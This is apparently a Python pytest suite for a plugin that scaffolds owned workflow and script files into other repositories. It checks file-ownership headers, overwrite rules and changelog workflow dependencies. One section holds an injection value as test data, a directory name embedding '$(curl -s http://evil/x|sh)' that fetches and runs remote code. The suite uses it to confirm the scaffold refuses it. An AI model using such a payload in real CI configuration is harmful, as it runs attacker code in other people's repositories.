"""Files the plugin owns inside someone else's repo.

Three contracts, and the whole point is that they are legible from inside the repo
rather than only in our documentation:

* **theirs** -- never read, never written.
* **defaults** -- created when absent, then theirs forever. Never overwritten.
* **ours** -- replaced on every update, and each one says so in its own first lines.

A copied file with no visible owner is a file somebody edits and loses. The header is
what makes the third contract survive being discovered six months later by a person
who was not in this conversation.
"""

import ast
import os
import subprocess
import sys
from pathlib import Path

import pytest

REPO_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(REPO_ROOT / "scripts"))

import scaffold  # noqa: E402


def _config(**overrides):
    config = {
        "repo": "owner/name",
        "default_branch": "main",
        "clone": "/src/name",
        "worktree_root": "/src/name-wt",
        "branch_pattern": "fix/{issue}",
        "test_command": "pytest",
        "version_sites": ["README.md"],
        "changelog_dir": "changelog.d",
        "docs_targets": ["README.md"],
        "labels": {"priority": [], "lanes": []},
        "state_file": ".max/oss-watch.json",
    }
    config.update(overrides)
    return config


def test_there_are_owned_files():
    assert scaffold.OWNED, "no owned files -- every check below would vacuously pass"


# ------------------------------------------ the directory name becomes shell source
#
# `changelog_dir` is substituted into the generated workflow's `run:` body. Nothing
# validated it, so `news.d$(curl -s http://evil/x|sh)` rendered into a live command
# substitution and was committed into somebody's repository to run in their CI (#31).
# The refusal belongs in `validate()`, and it is repeated here because `render_owned()`
# is reachable without ever calling `validate()`.

HOSTILE_DIR = "news.d$(curl -s http://evil/x|sh)"


def test_a_changelog_dir_carrying_a_substitution_never_reaches_a_generated_run_line():
    with pytest.raises(scaffold.ScaffoldError) as refusal:
        scaffold.render_owned(".github/workflows/oss-changelog.yml", _config(changelog_dir=HOSTILE_DIR))
    assert "changelog_dir" in str(refusal.value)


def test_the_whole_scaffold_refuses_a_changelog_dir_carrying_a_substitution(tmp_path):
    with pytest.raises(scaffold.ScaffoldError):
        scaffold.plan(tmp_path, _config(changelog_dir=HOSTILE_DIR))
    with pytest.raises(scaffold.ScaffoldError):
        scaffold.apply(tmp_path, _config(changelog_dir=HOSTILE_DIR), plugin_root=REPO_ROOT)
    assert not (tmp_path / ".github").exists(), "the scaffold wrote files before refusing"


def test_a_changelog_dir_that_is_not_a_string_is_refused_rather_than_crashing():
    with pytest.raises(scaffold.ScaffoldError):
        scaffold.render_owned(".github/workflows/oss-changelog.yml", _config(changelog_dir=17))


def test_a_nested_changelog_directory_still_renders():
    body = scaffold.render_owned(
        ".github/workflows/oss-changelog.yml", _config(changelog_dir="docs/changelog.d")
    )
    assert "docs/changelog.d" in body
    # Not just "it appears somewhere": a placeholder left in a line this test does not
    # look at renders literally into somebody's workflow and is invisible here.
    for placeholder in ("__FRAGMENTS__", "__DIR__", "__PACKAGES__"):
        assert placeholder not in body, placeholder


# ------------------------------------------------- the workflow can run what it calls
#
# The generated workflow set up Python and ran the vendored assembler with nothing in
# between. The assembler guards its one import and, when it is absent, reports `skipped`
# and exits non-zero -- correctly, and the job is red anyway. Observed live on a
# scaffolded repo's first pull request that carried a fragment (#17).


def _workflow_steps():
    """The generated workflow's run/uses lines, in order, as plain text.

    Deliberately not a YAML parse: the assertion is about what comes before what in the
    file a maintainer reads, and pyyaml is not a dependency of this repo.
    """
    body = scaffold.render_owned(".github/workflows/oss-changelog.yml", _config())
    return [line.strip() for line in body.splitlines() if line.strip().startswith("run:")]


def _guarded_import_roots(path):
    """Top-level modules imported inside a try/except -- the third-party ones.

    A guarded import is the shape of "this may not be installed". Reading them off the
    source rather than naming markdown-it-py here means a second dependency added to the
    assembler fails this suite instead of failing somebody's first pull request.
    """
    tree = ast.parse(path.read_text(encoding="utf-8"))
    roots = set()
    for node in ast.walk(tree):
        if not isinstance(node, ast.Try):
            continue
        for inner in ast.walk(node):
            if isinstance(inner, ast.Import):
                roots.update(alias.name.split(".")[0] for alias in inner.names)
            elif isinstance(inner, ast.ImportFrom) and inner.module and not inner.level:
                roots.add(inner.module.split(".")[0])
    return roots


def test_the_assembler_has_a_guarded_dependency_to_install():
    """Positive control. If the assembler ever stops guarding an import, the two tests
    below would be asserting about an empty set and pass without checking anything.
    """
    roots = _guarded_import_roots(REPO_ROOT / "scripts" / "assemble_changelog.py")
    assert roots, "no guarded imports found -- the checks below would vacuously pass"


def test_every_guarded_dependency_is_declared_for_the_workflow():
    """The drift guard. The workflow installs what scaffold declares; this pins that
    declaration to what the vendored script actually needs.
    """
    roots = _guarded_import_roots(REPO_ROOT / "scripts" / "assemble_changelog.py")
    assert roots == set(scaffold.ASSEMBLER_DEPENDENCIES)


def test_the_workflow_installs_the_assembler_dependency_before_running_it():
    steps = _workflow_steps()
    assert steps, "no run steps in the workflow -- the check below would pass vacuously"
    installs = [i for i, step in enumerate(steps) if "pip install" in step]
    runs = [i for i, step in enumerate(steps) if "assemble_changelog.py" in step]
    assert installs, "the workflow installs nothing"
    assert runs, "the workflow never runs the assembler"
    assert min(installs) < min(runs), steps


def test_the_workflow_installs_every_declared_dependency_by_its_package_name():
    body = scaffold.render_owned(".github/workflows/oss-changelog.yml", _config())
    for package in scaffold.ASSEMBLER_DEPENDENCIES.values():
        assert package in body, package


def test_the_owned_readme_names_the_dependency_a_maintainer_needs_locally():
    """CI is not the only place this runs. A maintainer checking fragments before
    pushing needs the same package, and nothing said so.
    """
    body = scaffold.render_owned(".oss/README.md", _config())
    for package in scaffold.ASSEMBLER_DEPENDENCIES.values():
        assert package in body, package


def test_zero_fragments_reach_a_verdict_without_the_parser(tmp_path):
    """Characterisation, not a regression guard -- this passes before and after the fix,
    and that is the point of writing it down.

    It is why the defect survived a scaffold-and-check: the scaffold pull request has no
    fragments, and with none the assembler concludes without needing a parser, so the job
    is green. The first pull request that carries a fragment is the first one that is
    red, and by then the maintainer has already verified the scaffold works.
    """
    shim = tmp_path / "shim"
    shim.mkdir()
    (shim / "markdown_it.py").write_text(
        "raise ImportError('not installed on this runner')\n", encoding="utf-8"
    )
    fragments = tmp_path / "changelog.d"
    fragments.mkdir()
    env = dict(os.environ, PYTHONPATH=str(shim))
    command = [
        sys.executable,
        str(REPO_ROOT / "scripts" / "assemble_changelog.py"),
        "--check",
        "--dir",
        str(fragments),
        "--changelog",
        str(tmp_path / "CHANGELOG.md"),
    ]

    empty = subprocess.run(
        command, env=env, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
        universal_newlines=True,
    )
    assert empty.returncode == 0, empty.stdout

    (fragments / "17.fixed.md").write_text("- a fragment (#17).\n", encoding="utf-8")
    carried = subprocess.run(
        command, env=env, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
        universal_newlines=True,
    )
    assert carried.returncode != 0, carried.stdout
    assert "markdown-it-py" in carried.stdout


def test_owned_files_live_in_one_directory():
    """Ownership by location, not by whether someone noticed a comment. One folder,
    one rule, and a reader can see the boundary without opening anything.
    """
    outside = [p for p in scaffold.OWNED if not p.startswith(scaffold.OWNED_DIR + "/")]
    assert outside == [".github/workflows/oss-changelog.yml"], outside


def test_the_owned_directory_explains_itself():
    """The README is the primary signal. A directory of generated files with no note
    is a directory somebody edits.
    """
    assert scaffold.OWNED_DIR + "/README.md" in scaffold.OWNED


def test_the_changelog_gate_and_its_script_are_owned():
    """The gate calls the script, and a runner checking out the managed repo has no
    plugin to reach into. Shipping one without the other is a red build on day one.
    """
    assert ".github/workflows/oss-changelog.yml" in scaffold.OWNED
    assert scaffold.OWNED_DIR + "/assemble_changelog.py" in scaffold.OWNED


def test_owned_files_are_written_on_apply(tmp_path):
    scaffold.apply(tmp_path, _config())
    for path in scaffold.OWNED:
        assert (tmp_path / path).is_file(), path


def test_owned_files_are_replaced_on_the_next_apply(tmp_path):
    """This is the contract that makes updates possible at all."""
    scaffold.apply(tmp_path, _config())
    target = tmp_path / ".github" / "workflows" / "oss-changelog.yml"
    target.write_text("edited by a human\n", encoding="utf-8")

    scaffold.apply(tmp_path, _config())
    assert target.read_text(encoding="utf-8") != "edited by a human\n"


def test_a_default_is_never_replaced_even_after_an_update(tmp_path):
    """The other side of it: SECURITY.md is a default, so it becomes theirs the
    moment it exists.
    """
    scaffold.apply(tmp_path, _config())
    theirs = tmp_path / "SECURITY.md"
    theirs.write_text("our own policy\n", encoding="utf-8")

    scaffold.apply(tmp_path, _config())
    assert theirs.read_text(encoding="utf-8") == "our own policy\n"


def test_every_owned_file_declares_that_it_is_overwritten(tmp_path):
    """Said in the file, because that is where someone about to edit it is looking."""
    scaffold.apply(tmp_path, _config())
    for path in scaffold.OWNED:
        head = (tmp_path / path).read_text(encoding="utf-8")[:900].lower()
        assert "oss plugin" in head, path
        assert "overwritten" in head, path
        assert "/oss:scaffold" in head, path


def test_the_header_tells_you_what_to_do_instead(tmp_path):
    """A prohibition with no alternative gets ignored by whoever needs the change."""
    scaffold.apply(tmp_path, _config())
    head = (tmp_path / ".github" / "workflows" / "oss-changelog.yml").read_text(encoding="utf-8")
    assert "copy it" in head.lower()


def test_the_plan_distinguishes_all_three_contracts(tmp_path):
    (tmp_path / "SECURITY.md").write_text("ours\n", encoding="utf-8")
    actions = {entry["path"]: entry["action"] for entry in scaffold.plan(tmp_path, _config())}
    assert actions["SECURITY.md"] == "present"
    assert actions["CLAUDE.md"] == "create"
    assert actions[".github/workflows/oss-changelog.yml"] == "replace"


def test_the_copied_script_is_the_one_the_plugin_ships(tmp_path):
    """Copied at write time from the plugin's own file rather than duplicated into a
    template string: two copies of 1164 lines drift, and only one of them is tested.
    """
    scaffold.apply(tmp_path, _config())
    copied = (tmp_path / scaffold.OWNED_DIR / "assemble_changelog.py").read_text(
        encoding="utf-8"
    )
    source = (REPO_ROOT / "scripts" / "assemble_changelog.py").read_text(encoding="utf-8")
    assert source.splitlines()[-1] in copied
    assert "UNTAGGED_RELEASES = frozenset()" in copied


def test_the_copied_script_still_carries_no_other_repos_releases(tmp_path):
    """The reason this file was edited at all. A regression here would reintroduce
    confident findings about a release history the managed repo has never had.
    """
    scaffold.apply(tmp_path, _config())
    copied = (tmp_path / scaffold.OWNED_DIR / "assemble_changelog.py").read_text(
        encoding="utf-8"
    )
    for version in ("0.19.0", "0.18.0", "0.11.0"):
        assert '"{}"'.format(version) not in copied, version
